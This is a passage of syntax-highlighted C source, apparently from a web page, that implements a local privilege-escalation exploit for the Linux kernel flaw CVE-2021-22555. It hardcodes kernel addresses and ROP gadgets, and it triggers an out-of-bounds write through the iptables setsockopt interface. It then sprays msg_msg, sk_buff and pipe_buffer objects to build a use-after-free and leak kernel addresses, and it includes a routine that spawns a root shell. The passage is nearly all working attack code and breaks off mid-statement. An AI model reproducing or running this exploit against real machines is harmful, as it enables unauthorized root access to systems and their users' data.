PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span 